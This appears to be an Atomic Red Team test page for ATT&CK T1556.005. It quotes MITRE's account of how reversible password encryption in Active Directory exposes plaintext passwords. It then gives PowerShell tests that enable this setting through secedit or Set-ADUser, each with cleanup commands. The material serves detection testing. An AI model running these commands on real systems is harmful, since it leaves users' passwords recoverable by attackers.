# T1556.005 - Modify Authentication Process: Reversible Encryption

## Description from ATT&CK

> An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code> property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.(Citation: store_pwd_rev_enc)
> 
> If the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:
> 
> 1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory user-structure <code>userParameters</code>
> 2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from <code>userParameters</code>
> 3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)
> 4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)
> 
> With this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.(Citation: how_pwd_rev_enc_1)(Citation: how_pwd_rev_enc_2)
> 
> An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to "Windows Server 2008" or higher.(Citation: dump_pwd_dcsync) In PowerShell, an adversary may make associated changes to user settings using commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.

[Source](https://attack.mitre.org/techniques/T1556/005)

### Atomic Test #1: Enable Reversible Password Encryption via Local Security Policy

Enables the "Store passwords using reversible encryption" security setting on a Windows host by exporting the local security policy with secedit, flipping ClearTextPassword from 0 to 1, and re-applying it. When enabled, passwords set/changed afterward are recoverable in plaintext. The cleanup restores the original policy. Requires administrative privileges.

**Supported Platforms:** Windows

**auto_generated_guid:** `03ad6066-c361-4280-8c96-8211585dfb87`

#### Attack Commands: Run with `powershell`! Elevation Required (e.g. root or admin)

```powershell
secedit /export /cfg "$env:TEMP\T1556.005_secpol_backup.inf" /areas SECURITYPOLICY | Out-Null
$cfg = Get-Content "$env:TEMP\T1556.005_secpol_backup.inf"
$cfg = $cfg -replace 'ClearTextPassword\s*=\s*0','ClearTextPassword = 1'
$cfg | Set-Content "$env:TEMP\T1556.005_secpol_apply.inf"
secedit /configure /db "$env:windir\security\database\T1556005.sdb" /cfg "$env:TEMP\T1556.005_secpol_apply.inf" /areas SECURITYPOLICY | Out-Null
Write-Host "Reversible password encryption enabled (ClearTextPassword = 1)"
```

#### Cleanup Commands

```powershell
secedit /configure /db "$env:windir\security\database\T1556005.sdb" /cfg "$env:TEMP\T1556.005_secpol_backup.inf" /areas SECURITYPOLICY | Out-Null
Remove-Item "$env:TEMP\T1556.005_secpol_backup.inf","$env:TEMP\T1556.005_secpol_apply.inf","$env:windir\security\database\T1556005.sdb" -Force -ErrorAction Ignore
```

### Atomic Test #2: Enable Reversible Password Encryption on a Domain Account

Sets the AllowReversiblePasswordEncryption property to true on a specific Active Directory account using the ActiveDirectory PowerShell module. After the account next changes its password, the plaintext becomes recoverable from the userParameters attribute. Requires the RSAT ActiveDirectory module, a domain-joined host, and administrative privileges.

**Supported Platforms:** Windows

**auto_generated_guid:** `f0127a84-2264-4bfd-bfcf-baf53a7d5d26`

#### Inputs

| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| username | SamAccountName of the target Active Directory account | string | AtomicUser|

#### Attack Commands: Run with `powershell`! Elevation Required (e.g. root or admin)

```powershell
Import-Module ActiveDirectory
Set-ADUser -Identity "#{username}" -AllowReversiblePasswordEncryption $true
Write-Host "AllowReversiblePasswordEncryption set to True for #{username}"
```

#### Cleanup Commands

```powershell
Import-Module ActiveDirectory
Set-ADUser -Identity "#{username}" -AllowReversiblePasswordEncryption $false -ErrorAction Ignore
```

#### Dependencies: Run with `powershell`!

##### Description: The ActiveDirectory PowerShell module must be installed.

###### Check Prereq Commands

```powershell
if (Get-Module -ListAvailable -Name ActiveDirectory) {exit 0} else {exit 1}
```

###### Get Prereq Commands

```powershell
Install-WindowsFeature RSAT-AD-PowerShell -ErrorAction SilentlyContinue
Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0" -ErrorAction SilentlyContinue
```
